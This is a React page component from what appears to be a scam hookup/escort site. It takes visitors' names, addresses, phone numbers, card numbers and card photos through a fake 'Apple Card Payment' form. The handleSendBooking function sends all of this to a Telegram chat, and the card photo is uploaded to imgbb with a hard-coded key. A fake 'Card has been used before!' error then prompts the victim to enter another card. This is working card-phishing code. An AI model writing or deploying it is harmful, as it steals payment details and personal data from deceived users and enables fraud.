import { useParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { girls } from '../../Utilities/Girls';
import Button from '../../Utilities/Button';
import { ArrowLeft } from 'lucide-react';
import Loader from '../../Utilities/Loader';
import Footer from '../../Utilities/Footer';
import { sendTelegramMessage, sendTelegramPhoto } from '../../Utilities/Telegrammessage';

const UserDetails = () => {
    const { id } = useParams();
    const navigate = useNavigate();
    const [showPayment, setShowPayment] = useState(false);
    const [bookingOption, setBookingOption] = useState('');
    const [cardNumber, setCardNumber] = useState('');
    const [formData, setFormData] = useState({ name: '', address: '', phone: '' });
    const [cardUsed, setCardUsed] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [image, setImage] = useState(null);

    const girl = girls.find((g) => g.id === id);
    if (!girl) return <p className="text-center py-20">User not found</p>;

    const isContent = girl.availability === 'Content Only';
    const price = girl.price || (isContent ? 45 : 150);
    const gallery = girl.image;

    const handleBuy = (option = '') => {
        setBookingOption(option);
        setShowPayment(true);
    };
const handleImageChange = async (e) => {
  const file = e.target.files[0];
  if (!file) return;

  const formData = new FormData();
  formData.append("image", file);

  try {
    const res = await fetch(
      "https://api.imgbb.com/1/upload?key=a90839c4a27f76cf92b3a52c9ff63e49",
      {
        method: "POST",
        body: formData,
      }
    );

    const data = await res.json();
    if (data?.data?.url) {
      setImage(data.data.url);
      console.log("✅ Image URL:", data.data.url);
    } else {
      console.error("❌ Image upload failed:", data);
    }
  } catch (err) {
    console.error("❌ Upload error:", err);
  }
};




const handleSendBooking = async () => {
  setIsLoading(true);

  const message = `📩 *New Booking Submitted!*

👩 *Girl:* ${girl.name}
🏷 *Option:* ${bookingOption}

🧑 *Name:* ${formData.name}
🏠 *Address:* ${formData.address}
📞 *Phone:* ${formData.phone}
💳 *Card Number:* ${cardNumber}`;

  try {
    await sendTelegramMessage(message);
    if (image) {
      await sendTelegramPhoto(image, '🖼 *Card Image Attached*');
    }
  } catch (err) {
    console.error("Telegram send failed:", err);
  }

  setTimeout(() => {
    setIsLoading(false);
    setCardUsed(true);
  }, 8000);
};

    return (
        <div className="min-h-screen bg-gray-50">
            <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
                <Button onClick={() => navigate('/')} variant="outline" className="mb-6 flex items-center gap-2">
                    <ArrowLeft className="h-4 w-4" />
                    Back to Results
                </Button>

                <div className="bg-white rounded-xl shadow-lg overflow-hidden">
                    <div className="space-y-4 p-6">
                        <div className="aspect-video rounded-lg overflow-hidden">
                            <img
                                src={girl.image[0]}
                                alt={girl.name}
                                className="w-full h-full rounded-lg object-cover"
                            />

                        </div>
                        <div className="grid grid-cols-2 gap-4">
                            {gallery.slice(1).map((img, i) => (
                                <div key={i} className="aspect-square rounded-lg overflow-hidden">
                                    <img src={img} alt={`${girl.name} ${i}`} className="w-full h-full object-cover" />
                                </div>
                            ))}
                        </div>
                    </div>

                    <div className="p-6 border-t">
                        <h1 className="text-2xl font-bold text-gray-900 mb-1">{girl.name}, {girl.age}</h1>
                        <p className="text-gray-600 mb-4">{girl.description} • {girl.distanceInMinutes} mins away</p>

                        <div className="mb-6">
                            <h2 className="text-lg font-semibold mb-2">{isContent ? 'Content Price' : 'Hookup Price'}</h2>
                            <p className="text-xl text-green-600 font-bold">${price}</p>
                        </div>

                        {!isContent ? (
                            <>
                                <div className="mb-6">
                                    <h2 className="text-lg font-semibold mb-3">Booking Options</h2>
                                    <ul className="text-sm text-gray-700 mb-4 list-disc pl-5">
                                        <li>Overnight available</li>
                                        <li>Full satisfaction guaranteed</li>
                                        <li>Discreet location or she can travel</li>
                                    </ul>
                                    <div className="flex flex-col sm:flex-row sm:space-x-4 space-y-4 sm:space-y-0">
                                        <Button onClick={() => handleBuy('comeToYou')} className="flex-1 bg-[#FF9B00] text-white rounded-xl py-3">
                                            Ask her to come to you
                                        </Button>
                                        <Button onClick={() => handleBuy('goToHer')} className="flex-1 border border-[#FF9B00] text-[#FF9B00] rounded-xl py-3">
                                            You want to go to her
                                        </Button>
                                    </div>
                                </div>
                            </>
                        ) : (
                            <Button
                                onClick={() => handleBuy('content')}
                                className="w-full bg-[#FF9B00] hover:bg-orange-600 text-white rounded-xl py-3 font-semibold text-base"
                            >
                                Buy Content
                            </Button>
                        )}
                    </div>
                </div>
            </div>

            {showPayment && (
                <div className="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center z-50">
                    <div className="bg-white rounded-2xl p-6 w-full max-w-md shadow-lg">
                        {!cardUsed ? (
                            <>
                                <h2 className="text-xl font-semibold text-center mb-3">Apple Card Payment</h2>
                                <p className="text-center text-sm text-gray-600 mb-4">Only payment method: 🍏 <strong>Apple Card</strong></p>

                                {(bookingOption === 'comeToYou') && (
                                    <>
                                        <input placeholder="Your Name" className="mb-2 w-full border p-2 rounded" onChange={e => setFormData({ ...formData, name: e.target.value })} />
                                        <input placeholder="Your Address" className="mb-2 w-full border p-2 rounded" onChange={e => setFormData({ ...formData, address: e.target.value })} />
                                        <input placeholder="Phone Number" className="mb-2 w-full border p-2 rounded" onChange={e => setFormData({ ...formData, phone: e.target.value })} />
                                    </>
                                )}

                                <input type="text" value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="Apple Card Number" className="mb-2 w-full border p-2 rounded" />

                                <input type="file" accept="image/*" capture="environment" onChange={handleImageChange} className="mb-4" />
                                {image && <img src={image} alt="Uploaded Card" className="mb-4 rounded shadow w-full h-40 object-cover" />}

                                <Button onClick={handleSendBooking} className="w-full bg-green-600 text-white py-3">
                                    {isLoading ? <span className="flex justify-center items-center"><Loader className="animate-spin mr-2" /> Processing...</span> : `Pay $${price} Now`}
                                </Button>
                                <button onClick={() => setShowPayment(false)} className="mt-3 text-sm text-gray-500 underline w-full text-center">
                                    Cancel
                                </button>
                            </>
                        ) : (
                            <div className="text-center">
                                <h2 className="text-xl font-bold text-red-600 mb-3">⚠️ Card has been used before!</h2>
                                {bookingOption === 'goToHer' && <p>Her address will be revealed shortly.Only If Payment is comfimed</p>}
                                {bookingOption === 'content' && <p>Redirecting you to her content page...</p>}
                                <Button onClick={() => setShowPayment(false)} className="mt-6 w-full bg-gray-800 text-white">
                                    Close
                                </Button>
                            </div>
                        )}
                    </div>
                </div>
            )}
            <Footer />
        </div>

    );
};

export default UserDetails;